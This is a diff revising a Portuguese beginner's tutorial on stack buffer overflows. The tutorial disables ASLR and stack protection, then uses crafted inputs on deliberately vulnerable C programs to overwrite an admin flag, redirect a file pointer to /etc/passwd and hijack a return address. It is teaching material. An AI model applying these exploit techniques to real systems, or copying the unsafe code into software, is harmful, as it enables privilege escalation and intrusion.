@@ -58,63 +58,57 @@ Buffer Overflows para Iniciantes
 - Identificando a vulnerabilidade
 - Métodos de Exploração
     Podemos sobrescrever outras variáveis da pilha
-    Podemos tambem, sobrescrever por exemplo, um ponteiro.
-    Tomar o constrole de fluxo da aplicação!
+    Podemos também, sobrescrever por exemplo, um ponteiro.
+    Tomar o controle de fluxo da aplicação!
 - Conclusão
 - Agradecimentos
 
 - Apresentação
   
-       Eu sou m0nad, visitem meu github ( https://github.com/m0nad ) e meu email é m0nad [at] email.com .
-       Estou aqui para demonstrar o funcionamento de buffer overflows, esta técnica muito falada, mas pouco entendida,
-     teremos aqui uma introdução ao tema.
+       Eu me chamo Victor Ramos Mello aka m0nad, tenho um github ( https://github.com/m0nad ) e meu email é m0nad /at/ email.com.
+
+       Estou aqui para demonstrar o funcionamento de buffer overflows, esta técnica muito falada, mas pouco entendida, teremos aqui uma introdução ao tema.
 
 - Oque é Buffer Overflow?
 
-       Buffer overflow, traduzindo, seria transbordamento de memória, acontece quando se coloca mais dados do que a 
-     capacidade de um buffer. Isso acontece, pois o programador, não verifica a quantidade de dados que irão ser colocados 
-     dentro de uma determinada area de memória, este excesso de dados, pode levar ao corrompimento de outras areas de 
-     memória adjacentes, levando ao programa a comportamentos inesperados, ou mesmo o travamento do programa.
-       Um atacante pode se utilizar disso para travar a aplicação propositalmente ou mesmo tomar o controle do fluxo
-     do programa, possibilitando ganhar privilegios no sistema, no caso de uma aplicação remota, a possibilidade de se
-     ganhar acesso ao sistema. 
+       Buffer overflow, traduzindo, seria transbordamento de memória, acontece quando se coloca mais dados do que a capacidade de um buffer. Isso acontece, pois o programador, não verifica a quantidade de dados que irão ser colocados dentro de uma determinada área de memória, este excesso de dados, pode levar ao corrompimento de outras áreas de memória adjacentes, levando ao programa a comportamentos inesperados, ou mesmo o travamento do programa.
+
+       Um atacante pode se utilizar disso para travar a aplicação propositalmente ou mesmo tomar o controle do fluxo do programa, possibilitando ganhar privilégios no sistema, no caso de uma aplicação remota, a possibilidade de se ganhar acesso ao sistema. 
 
 - Desabilitando Proteções
  
-      Com o advento das técnicas de exploração deste tipo de vulnerabilidáde, proteções foram desenvolvidas, para que mesmo 
-    quando o programa for de fato vulnerável, o sistema não possa ser comprometido, algumas dessas proteções estão vindo 
-    por default em distros como Ubuntu e Fedora, por exemplo, no caso, fiz todos os testes em Ubuntu 10.10, e para 
-    este , tive que desabilitar algumas proteções, como Adress Space Layout Randomization, chamado simplesmente de ASLR,
-    este tipo de proteção, deixa areas de memória, (como stack, heap, libc) com  endereços 'aleatórios', dificultando 
-    a exploração de vulnerábilidades, desse tipo.
+      Com o advento das técnicas de exploração deste tipo de vulnerabilidade, proteções foram desenvolvidas, para que mesmo quando o programa for de fato vulnerável, o sistema não possa ser comprometido, algumas dessas proteções estão vindo por default em distros como Ubuntu e Fedora por exemplo, no caso, fiz todos os testes em Ubuntu 10.10 e para este, tive que desabilitar algumas proteções, como Adress Space Layout Randomization, chamado simplesmente de ASLR, este tipo de proteção, deixa áreas de memória, (como stack, heap, libc) com  endereços 'aleatórios', dificultando a exploração de vulnerabilidades desse tipo.
 
-      Outro tipo de sistema de proteção, é o Smash The Stack Protection, tambem conhecido como ProPolice, este tipo 
-    de proteção funciona colocando-se um 'cookie', ou seja um valor, logo abaixo da stack, e caso este valor seja 
-    alterado, devido a um transbordamento, uma função ira verificar o valor do cookie, caso esteja diferente, o programa
-    e' finalizado.
+      Outro tipo de sistema de proteção, é o Smash The Stack Protection também conhecido como ProPolice, este tipo de proteção funciona colocando-se um 'cookie', ou seja um valor, no topo do buffers, e caso este valor seja alterado, devido a um transbordamento, uma função ira verificar o valor do cookie, caso esteja diferente, o programa é finalizado.
 
-      Para desabilitar o SSP(smash the stack protection aka propolice), quando for compilar seu código vulnerável, basta
-    acrescentar o argumento '-fno-stack-protector' no momento de compilar o seu codigo.
+      Para desabilitar o SSP(smash the stack protection aka propolice), quando for compilar seu código vulnerável, basta acrescentar o argumento '-fno-stack-protector' no momento de compilar o seu código.
 
  ex:
+-------------------------------------
 
-   $ gcc vuln.c -o vuln -fno-stack-protector
+$ gcc vuln.c -o vuln -fno-stack-protector
+
+-------------------------------------
 
  E Para desabilitar o ASLR, basta digitar, como root:
 
-   # echo 0 > /proc/sys/kernel/randomize_va_space
+-------------------------------------
 
+# echo 0 > /proc/sys/kernel/randomize_va_space
+
+-------------------------------------
 - Identificando a vulnerabilidade
    
-      Como mencionei acima, a falha acontece quando o programador não verifica a quantidade de dados que serão colocados em
-   um determinado buffer.
-      Quando os dados que serão copiados para dentro de um buffer, forem de origem do 'imput' do usuario, um atacante poderá 
-   se aproveitar disso.
-      Um exemplo disso seria a função gets(), que não verifica quandos bytes serão colocados dento de um determinado buffer.
+      Como mencionei acima, a falha acontece quando o programador não verifica a quantidade de dados que serão colocados em um determinado buffer.
+
+      Quando os dados que serão copiados para dentro de um buffer, forem de origem do 'imput' do usuário, um atacante poderá se aproveitar disso.
+
+      Um exemplo disso seria a função gets(), que não verifica quantos bytes serão colocados dento de um determinado buffer.
 
 Exemplo:
 
 -------------------------------------
+
 m0nad@m0nad-desktop:~$ cat bo_gets.c 
 #include <stdio.h>
 #include <string.h>
@@ -127,25 +121,26 @@ main ()
   gets(buffer);
   return 0;
 }
-m0nad@m0nad-desktop:~$ gcc -o bo_gets bo_gets.c 
+m0nad@m0nad-desktop:~$ gcc -o bo_gets bo_gets.c -fno-stack-protector
 /tmp/ccFfap5X.o: In function `main':
 bo_gets.c:(.text+0x11): warning: the `gets' function is dangerous and should not be used.
 m0nad@m0nad-desktop:~$ ./bo_gets 
 AAAAAAAAAAAAAAAAAA
 Falha de segmentação
 m0nad@m0nad-desktop:~$ 
+
 -------------------------------------
 
-      Vimos que a aplicação 'crasha' ao se colocar um pouco mais do que 4 bytes, que seria o limite do buffer, 
-    o porque isso acontece sera explicado mais a frente, vamos ver agora como tirar proveito disso.
+      Vimos que a aplicação 'crasha' ao se colocar um pouco mais do que 4 bytes, que seria o limite do buffer, o porque isso acontece sera explicado mais a frente, vamos ver agora como tirar proveito disso.
 
 - Métodos de Exploração
 
       Podemos sobrescrever outras variáveis da pilha.
-      Por exemplo, sobrescrever uma variável, que no caso verifica se o usuario é admin e assim possivelmente, 
-    ganhar privilegios.
+
+      Por exemplo, sobrescrever uma variável, que no caso verifica se o usuário é admin e assim possivelmente ganhar privilégios.
 
 -------------------------------------
+
 m0nad@m0nad-desktop:~$ cat bo_admin.c 
 #include <stdio.h>
 #include <stdlib.h>
@@ -171,14 +166,13 @@ m0nad@m0nad-desktop:~$ gcc -o bo_admin bo_admin.c -fno-stack-protector
 m0nad@m0nad-desktop:~$ ./bo_admin m0nad
 Bem vindo m0nad
 m0nad@m0nad-desktop:~$
--------------------------------------
-
-
-      Bem, nesse código nao ah uma verificação para mudar o valor da variável 'admin' de '0',
-    para algo diferente de zero, que validaria o nosso 'if', o único jeito, seria com um overflow, vamos ver.
-
 
 -------------------------------------
+
+      Bem, nesse código nao ah uma verificação para mudar o valor da variável 'admin' de '0', para algo diferente de zero, que validaria o nosso 'if', o único jeito, seria com um overflow, vamos ver.
+
+-------------------------------------
+
 m0nad@m0nad-desktop:~$ ./bo_admin m0nad
 Bem vindo m0nad
 m0nad@m0nad-desktop:~$ ./bo_admin m0nad____________
@@ -186,20 +180,20 @@ Bem vindo m0nad____________
 HACKED!
 Voce eh admin
 m0nad@m0nad-desktop:~$
--------------------------------------
-
-    Sucesso! HACKED! somos admin! :)
-
-      Isso acontece porque a variável 'user', sofreu um transbordamento e atingiu a variável 'admin', 
-    modicando seu conteúdo para algo diferente de '0', validando assim o nosso 'if', 
-    que verifica se somos admins.
-
-      Podemos tambem, sobrescrever por exemplo, um ponteiro.
-
-    Vejamos o código!
 
 -------------------------------------
-m0nad@m0nad-desktop:~$ cat bo_poiter.c 
+
+      Sucesso! HACKED! somos admin! :)
+
+      Isso acontece porque a variável 'user', sofreu um transbordamento e atingiu a variável 'admin', modicando seu conteúdo para algo diferente de '0', validando assim o nosso 'if', que verifica se somos admins.
+
+      Podemos também, sobrescrever por exemplo, um ponteiro.
+
+      Vejamos o código:
+
+-------------------------------------
+
+m0nad@m0nad-desktop:~$ cat bo_pointer.c 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -216,30 +210,24 @@ main (int argc, char** argv)
     printf ("Arquivo depois : %s\n", arquivo);
   }
 }
-m0nad@m0nad-desktop:~$ gcc -o bo_poiter bo_poiter.c 
-
-m0nad@m0nad-desktop:~$ ./bo_poiter AAA
-Arquivo antes : /tmp/arquivo
-Arquivo depois : /tmp/arquivo
--------------------------------------
-
-      Sera que conseguimos transbordar a variável buffer, ate' chegarmos na variável 'arquivo'?
-    Hmm...vamos ver :)
-
--------------------------------------
-
-m0nad@m0nad-desktop:~$ ./bo_poiter AAA
+m0nad@m0nad-desktop:~$ gcc -o bo_pointer bo_pointer.c -fno-stack-protector 
+m0nad@m0nad-desktop:~$ ./bo_pointer AAA
 Arquivo antes : /tmp/arquivo
 Arquivo depois : /tmp/arquivo
 
-m0nad@m0nad-desktop:~$ ./bo_poiter AAAA
+-------------------------------------
+
+      Sera que conseguimos transbordar a variável buffer, ate' chegarmos na variável 'arquivo'? Hmm...vamos ver :)
+
+-------------------------------------
+
+m0nad@m0nad-desktop:~$ ./bo_pointer AAAA
 Arquivo antes : /tmp/arquivo
 Arquivo depois : ��u���[]Ð�U��S��
+
 -------------------------------------
 
-     Vemos que de alguma forma afetamos o endereço para onde a variável ponteiro 'arquivo' estava 
-   apontando. Isso ocorre pois o buffer so tem a capacidade de armazenar 4 bytes, ou seja, no máximo
-   3 'A's e mais o nullbyte. Algo como:
+     Vemos que de alguma forma afetamos o endereço para onde a variável ponteiro 'arquivo' estava apontando. Isso ocorre pois o buffer so tem a capacidade de armazenar 4 bytes, ou seja, no máximo 3 'A's e mais o nullbyte. Algo como:
 
 -------------------------------------
 
@@ -251,21 +239,22 @@ buffer[3] = '\0';
 -------------------------------------
 
       Quando colocamos mais do que 4 bytes, o buffer 'acima' é sobrescrito.
-      Mas será que podemos colocar um endereço valido?
-      Claro que sim! veja o exemplo! (lembre-se de desabilitar o ASLR, como mencionei a cima)
+
+      Mas será que podemos colocar um endereço valido? Claro que sim! veja o exemplo! (lembre-se de desabilitar o ASLR, como mencionei a cima)
 
 -------------------------------------
+
 m0nad@m0nad-desktop:~$ export HACK="/etc/passwd"
 
 m0nad@m0nad-desktop:~$ ./getenv HACK
 O endereço e': 0xbffff6de
 Seu conteúdo e': /etc/passwd
 
-m0nad@m0nad-desktop:~$ ./bo_poiter AAAA`printf "\xde\xf6\xff\xbf"`
+m0nad@m0nad-desktop:~$ ./bo_pointer AAAA`printf "\xde\xf6\xff\xbf"`
 Arquivo antes : /tmp/arquivo
 Arquivo depois : asswd
 
-m0nad@m0nad-desktop:~$ ./bo_poiter AAAA`printf "\xd8\xf6\xff\xbf"`
+m0nad@m0nad-desktop:~$ ./bo_pointer AAAA`printf "\xd8\xf6\xff\xbf"`
 Arquivo antes : /tmp/arquivo
 Arquivo depois : /etc/passwd
 
@@ -273,15 +262,12 @@ Arquivo depois : /etc/passwd
 
       Sucesso! Conseguimos alterar o valor da variável! para algo que queriamos.
 
-      Vejam que colocamos o endereço em 'little endian', onde o valor 0xbffff6de, ficou 'de f6 ff bf'.
-    mas so pegou o 'asswd', isso é por causa do alinhamento da pilha, com um pequeno cálculo, colocamos
-    o endereço certo, e conseguimos o '/etc/passwd'.
+      Vejam que colocamos o endereço em 'little endian', onde o valor 0xbffff6de, ficou 'de f6 ff bf'. mas só pegou o 'asswd', isso é por causa do alinhamento da pilha, com um pequeno cálculo, colocamos o endereço certo, e conseguimos o '/etc/passwd'.
 
-      Bem se foce um suidroot, que alteraria esse arquivo temporário, baseado em algo que escrevemos,
-    poderiamos possivelmente escrever dentro de /etc/passwd, adicionando talvez um usuario como root!
-    abaixo o código do 'getenv'.
+      Bem se foce um suidroot, que alteraria esse arquivo temporário, baseado em algo que escrevemos, poderiamos possivelmente escrever dentro de /etc/passwd, adicionando talvez um usuário como root! abaixo o código do 'getenv':
 
 -------------------------------------
+
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -298,23 +284,17 @@ main (int argc, char **argv)
     printf ("O endereço e': %p\nSeu conteúdo e': %s\n", path, path);
   return 0;
 }
--------------------------------------
-
-    Tomar o constrole de fluxo da aplicação!
-
-      Podemos sobrescrever por exemplo, um ponteiro para uma funcao, poderiamos altera-lo  para o 
-    endereço de qualquer função dentro do código, ou mesmo fora dele, quando essa variável tipo 
-    ponteiro para função foce chamada, executaria oque apontar-mos, no caso de um suidroot, poderiamos
-    executar uma shell, recebendo assim acesso root! Ou no caso de um servidor, nos dando acesso ao 
-    sistema.
-
-      Bem, mas isso nem sempre é nescessário, ja que quando se tratando de buffer overflows em variáveis 
-    locais, que são localizadas na pilha(stack), então estamos tratando de transbordamentos dentro da pilha
-    (stack-based buffer overflows), podemos sobrescrever o 'endereço de retorno', que é salvo na pilha, 
-    a cada vez que se chama uma função. Por exemplo, em assembly, quando se chama uma função usamos a 
-    instrução(opcode, operation code), 'call', seguida do endereço da função, ex:
 
 -------------------------------------
+
+    Tomar o controle de fluxo da aplicação!
+
+      Podemos sobrescrever por exemplo, um ponteiro para uma função, alterando-o para o endereço de qualquer função dentro do código, ou mesmo fora dele, quando essa variável tipo ponteiro para função foce chamada, executaria oque apontarmos, no caso de um suid-root, poderíamos executar uma shell recebendo assim acesso root! Ou no caso de um servidor, nos dando acesso ao sistema.
+
+      Bem, mas isso nem sempre é necessário, já que quando se tratando de buffer overflows em variáveis locais, que são localizadas na pilha(stack), então estamos tratando de transbordamentos dentro da pilha (stack-based buffer overflows), podemos sobrescrever o 'endereço de retorno', que é salvo na pilha a cada vez que se chama uma função. Por exemplo, em assembly quando se chama uma função usamos a instrução 'call', seguida do endereço da função, ex:
+
+-------------------------------------
+
 m0nad@m0nad-desktop:~$ cat > puts.c
 #include <stdio.h>
 int
@@ -326,12 +306,9 @@ main ()
 ^C
 
 m0nad@m0nad-desktop:~$ gcc -o puts puts.c 
-
 m0nad@m0nad-desktop:~$ ./puts 
 exemplo
-
 m0nad@m0nad-desktop:~$ gdb puts 
-
 GNU gdb (GDB) 7.1-ubuntu
 Copyright (C) 2010 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@@ -342,7 +319,6 @@ This GDB was configured as "i486-linux-gnu".
 For bug reporting instructions, please see:
 <http://www.gnu.org/software/gdb/bugs/>...
 Lendo símbolos de /home/m0nad/puts...(no debugging symbols found)...concluído.
-
 (gdb) disas main
 Dump of assembler code for function main:
    0x080483e4 <+0>:	push   %ebp
@@ -354,24 +330,19 @@ Dump of assembler code for function main:
    0x080483f9 <+21>:	leave  
    0x080483fa <+22>:	ret    
 End of assembler dump.
-
 (gdb) 
--------------------------------------
-
-      Usando o gdb, com o comando 'disas main', nos 'disassemblamos' a função main, mostrando assim, as 
-    instruções utilizados para realizar esse codigo.
-      Vemos a linha '   0x080483f4 <+16>:	call   0x8048318 <puts@plt>', chamando a funcao puts. 
-    Quando a intrução 'call' é chamada, ela da um 'push' no enredeço da proxima instrução, nesse 
-    caso '0x080483f9', ou seja, salva este endereço na pilha, e depois aplica um 'jmp' para '0x8048318', 
-    ou seja, da um pulo para essa parte do código,  que é a função 'puts', o motivo para que, a instrução
-    'call' salva o endereço na pilha, é para saber, para onde o programa deve voltar, quando sair da funcao 
-    'puts', ou seja, aonde deve retornar dentro da  função 'main'. Sabendo disso, podemos sobrescrever esse 
-    endereço de retorno salvo na pilha! E assim tomar o controle do fluxo da aplicação!
-
-  Vejamos !
 
 -------------------------------------
-m0nad@m0nad-desktop:~$ cat bo1.c 
+
+      Usando o gdb, com o comando 'disas main', nos 'disassemblamos' a função main, mostrando assim, as instruções utilizados para realizar esse código.
+
+      Vemos a linha '   0x080483f4 <+16>:	call   0x8048318 <puts@plt>', chamando a função puts. Quando a instrução 'call' é chamada, ela da um 'push' no endereço da próxima instrução, nesse caso '0x080483f9', ou seja, salva este endereço na pilha, e depois aplica um 'jmp' para '0x8048318', ou seja, da um pulo para essa parte do código,  que é a função 'puts', o motivo para que, a instrução 'call' salva o endereço na pilha, é para saber, para onde o programa deve voltar, quando sair da função 'puts', ou seja, aonde deve retornar dentro da  função 'main'. Sabendo disso, podemos sobrescrever esse endereço de retorno salvo na pilha! E assim tomar o controle do fluxo da aplicação!
+
+      Vejamos:
+
+-------------------------------------
+
+m0nad@m0nad-desktop:~$ cat bo_hack.c 
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -392,20 +363,13 @@ main (int argc, char** argv)
 
   return 0;
 }
-
-m0nad@m0nad-desktop:~$ gcc -o bo1 bo1.c -Wall
-
-m0nad@m0nad-desktop:~$ ./bo1 AAAA
-
+m0nad@m0nad-desktop:~$ gcc -o bo_hack bo_hack.c -fno-stack-protector
+m0nad@m0nad-desktop:~$ ./bo_hack AAAA
 Endereco de hack : 0x8048484
-
-m0nad@m0nad-desktop:~$ ./bo1 AAAAAAAAAAAAAAAA
-
+m0nad@m0nad-desktop:~$ ./bo_hack AAAAAAAAAAAAAAAA
 Endereco de hack : 0x8048484
 Falha de segmentação
-
-m0nad@m0nad-desktop:~$ gdb bo1
-
+m0nad@m0nad-desktop:~$ gdb bo_hack
 GNU gdb (GDB) 7.1-ubuntu
 Copyright (C) 2010 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@@ -415,93 +379,73 @@ and "show warranty" for details.
 This GDB was configured as "i486-linux-gnu".
 For bug reporting instructions, please see:
 <http://www.gnu.org/software/gdb/bugs/>...
-Lendo símbolos de /home/m0nad/bo1...(no debugging symbols found)...concluído.
-
+Lendo símbolos de /home/m0nad/bo_hack...(no debugging symbols found)...concluído.
 (gdb) r AAAAAAAAAAAAAAAA
-
-Starting program: /home/m0nad/bo1 AAAAAAAAAAAAAAAA
+Starting program: /home/m0nad/bo_hack AAAAAAAAAAAAAAAA
 Endereco de hack : 0x8048484
 
 Program received signal SIGSEGV, Segmentation fault.
 0xb7e8ab00 in __libc_start_main () from /lib/tls/i686/cmov/libc.so.6
-
 (gdb) r AAAAAAAAAAAAAAAAAAA
-
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-
-Starting program: /home/m0nad/bo1 AAAAAAAAAAAAAAAAAAA
+Starting program: /home/m0nad/bo_hack AAAAAAAAAAAAAAAAAAA
 Endereco de hack : 0x8048484
 
 Program received signal SIGSEGV, Segmentation fault.
 0x00414141 in ?? ()
-
 (gdb) r AAAAAAAAAAAAAAAAAAAA
-
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-
-Starting program: /home/m0nad/bo1 AAAAAAAAAAAAAAAAAAAA
+Starting program: /home/m0nad/bo_hack AAAAAAAAAAAAAAAAAAAA
 Endereco de hack : 0x8048484
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
+
 -------------------------------------
 
     Vemos que recebemos um 'Segmentation fault'
 
+-------------------------------------
+
 'Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()'
 
-    Pois sobrescrevemos o endereco de retorno, salvo na pilha, e este valor, é copiado para o 
-  contador de instrucões (instruction pointer[eip]), jogando o eip para '0x41414141'
-  ou seja, o programa tenta pular pra esse endereço de memória, que nada mais sao do que o valor
-  em hexadecimal em ASCII do caractere 'A', como esta area de memória nao possui um código valido
-  ou permissão de execucao, o programa 'crasha', agora você ja sabe o porquê :).
-    Caso colocar-mos o endereço da função 'hack' no exato lugar do de onde esta o '0x41414141',
-  podemos executa-la!
+-------------------------------------
 
-  Vamos tentar.
+    Pois sobrescrevemos o endereço de retorno, salvo na pilha, e este valor, é copiado para o contador de instrucões (instruction pointer[eip]), jogando o eip para '0x41414141' ou seja, o programa tenta pular pra esse endereço de memória, que nada mais são do que o valor em hexadecimal em ASCII do caractere 'A', como esta área de memória não possui um código valido ou permissão de execução, o programa 'crasha', agora você já sabe o porquê :).
+
+    Caso colocarmos o endereço da função 'hack' no exato lugar do de onde esta o '0x41414141', podemos executa-la!
+
+    Vamos tentar:
 
 -------------------------------------
-(gdb) r AAAAAAAAAAAAAAAA`printf "\x84\x84\x04\x08"`
 
+(gdb) r AAAAAAAAAAAAAAAA`printf "\x84\x84\x04\x08"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /home/m0nad/bo1 AAAAAAAAAAAAAAAA`printf "\x84\x84\x04\x08"`
+Starting program: /home/m0nad/bo_hack AAAAAAAAAAAAAAAA`printf "\x84\x84\x04\x08"`
 Endereco de hack : 0x8048484
 Hacking!
 
 Program exited normally.
-
 (gdb) q
-
-m0nad@m0nad-desktop:~$ ./bo1  AAAAAAAAAAAAAAAA`printf "\x84\x84\x04\x08"`
-
+m0nad@m0nad-desktop:~$ ./bo_hack  AAAAAAAAAAAAAAAA`printf "\x84\x84\x04\x08"`
 Endereco de hack : 0x8048484
 Hacking!
-
-m0nad@m0nad-desktop:~$ 
+m0nad@m0nad-desktop:~$
+ 
 -------------------------------------
 
-    Sucesso! com isso podemos setar o nosso endereço de retorno para qualquer lugar que quizermos!
-    E assim tomar o controle da aplicação!
+    Sucesso! com isso podemos setar o nosso endereço de retorno para qualquer lugar que quizermos! E assim tomar o controle da aplicação!
 
-    Poderiamos setar o endereço para um código valido, feito por nós, chamado de shellcode ou payload,
-  ou para um endereço da libc, com a funcao system, e assim executar comandos na maquina, essa técnica
-  é chamada de return to libc, ou seja, retornar para a libC, essa técnica eu destrevo em um artigo meu
-  Retornando para libC, http://www.exploit-db.com/papers/13640/ || http://bugsec.googlecode.com/files/pt_ret2libc.txt
+    Poderiamos setar o endereço para um código valido, feito por nós, chamado de shellcode ou payload, ou para um endereço da libc, com a funcao system, e assim executar comandos na maquina, essa técnica é chamada de return to libc, ou seja, retornar para a libC, essa técnica eu descrevo em um artigo meu Retornando para libC (https://raw.github.com/m0nad/Papers/master/ret2libc.txt)
 
 - Conclusão 
 
-    Buffer overflows são uma falha de segurança seria, que podem levar ao comprometimento da aplicação, travando-a, ou controlando seu fluxo,
-e dependendo do nivel de permissão da aplicação, pode-se levar ao comprometimento do sistema.
-
-- Agradecimentos
-
-    Agradeço ao pessoal do BugSec Team: i4k, Cooler_, _mlk_, sigsegv, bman.
+    Buffer overflows são uma falha de segurança seria, que podem levar ao comprometimento da aplicação, travando-a, ou controlando seu fluxo, e dependendo do nivel de permissão da aplicação, pode-se levar ao comprometimento do sistema.
 
 
-  
 
 
